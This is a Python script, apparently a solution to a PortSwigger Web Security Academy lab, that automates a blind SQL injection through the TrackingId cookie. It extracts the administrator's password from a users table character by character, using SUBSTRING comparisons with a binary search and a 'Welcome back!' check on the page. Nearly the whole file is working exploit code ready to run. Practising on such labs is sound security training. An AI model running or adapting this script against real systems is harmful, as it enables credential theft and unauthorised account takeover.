# Author: Nguyen Son
# Created date: 15/05/2023

import time
import urllib.parse as urlparse

import requests
from selectolax.parser import HTMLParser

# BEGIN: CONSTANT
url = 'https://0a0f001d031b14bf81ee34c60058009a.web-security-academy.net/'  # Please check this url before run
injected_cookie_name = 'TrackingId'
username = 'administrator'
# END: CONSTANT

program_start_time = time.time()
print("Running...")

host = urlparse.urlparse(url).netloc  # get url host name

session = requests.session()  # create a new session
page = session.get(url)  # request url

injected_cookie_value = page.cookies.get(injected_cookie_name)  # get cookie to inject after first request


def generate_payload(comparator, start_position, length, check_string):
    return str(injected_cookie_value) + \
        "' AND SUBSTRING((SELECT password FROM users WHERE username='" + str(username) + "'), " + \
        str(start_position) + ", " + str(length) + ") " + comparator + " '" + check_string


def check_password_character(test_cookie_value):
    session.cookies.set(injected_cookie_name, test_cookie_value, domain=host)
    test_page = session.get(url)
    # print(session.cookies)
    page_source = test_page.content
    # start_time = time.time()
    tree = HTMLParser(page_source)
    welcome_back_check = tree.css_first("section.top-links").text().find("Welcome back!")
    # print("\nTime: %s" % (time.time() - start_time))
    return welcome_back_check != -1


# old version, not using
def check_password_character_in_range_old(position, start_char, end_char):
    char = start_char
    while char <= end_char:
        test_cookie_value = generate_payload("=", position, 1, char)
        if check_password_character(test_cookie_value):
            return char
        char = chr(ord(char) + 1)
    return ''


def check_password_character_in_range(position, start_char, end_char):
    while start_char <= end_char:
        mid_char = chr((ord(start_char) + ord(end_char)) // 2)
        if start_char == mid_char:
            test_cookie_value = generate_payload("=", position, 1, start_char)
            if check_password_character(test_cookie_value):
                return start_char
            else:
                test_cookie_value = generate_payload("=", position, 1, end_char)
                if check_password_character(test_cookie_value):
                    return end_char
                else:
                    return ''
        else:
            test_cookie_value = generate_payload(">=", position, 1, mid_char)
            if check_password_character(test_cookie_value):
                start_char = mid_char
            else:
                end_char = mid_char
    return ''


i = 1
result = ""
while True:
    start_time = time.time()
    test_cookie_value = generate_payload(">=", i, 1, 'a')
    if check_password_character(test_cookie_value):
        char = check_password_character_in_range(i, 'a', 'z')
    else:
        test_cookie_value = generate_payload(">=", i, 1, 'A')
        if check_password_character(test_cookie_value):
            char = check_password_character_in_range(i, 'A', 'Z')
        else:
            char = check_password_character_in_range(i, '0', '9')
    print("Time: %s" % (time.time() - start_time), end="\t\t - ")
    if char != '':
        print(char)
        result += char
        i += 1
        continue
    else:
        break

print('\n\nPassword: %s' % result)

print("\nRunning time: %s" % (time.time() - program_start_time))